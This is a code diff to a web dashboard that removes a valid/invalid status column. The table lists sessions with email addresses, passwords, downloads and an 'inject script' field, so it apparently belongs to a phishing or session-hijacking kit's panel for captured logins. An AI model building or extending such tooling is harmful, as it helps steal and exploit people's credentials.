@@ -903,7 +903,6 @@
                     <table class="data-table">
                         <thead>
                             <tr>
-                                <th>Status</th>
                                 <th>Email Address</th>
                                 <th>Password</th>
                                 <th>Download</th>
@@ -1164,10 +1163,6 @@
                         injectColumn = `<span style="color: #94a3b8;">NO INJECT SCRIPT</span>`;
                     }
 
-                    const statusBadge = session.status === 'valid' 
-                        ? `<span class="status-badge status-success">✅ Valid</span>`
-                        : `<span class="status-badge status-error">❌ Invalid</span>`;
-
                     // Build session info HTML with proper null checks
                     let sessionInfoHtml = `<div>ID: ${session.id || 'N/A'}</div>`;
 
@@ -1198,7 +1193,6 @@
                     }
 
                     row.innerHTML = `
-                        <td>${statusBadge}</td>
                         <td class="email-cell">${session.email || 'N/A'}</td>
                         <td>${passwordColumn}</td>
                         <td>${injectColumn}</td>
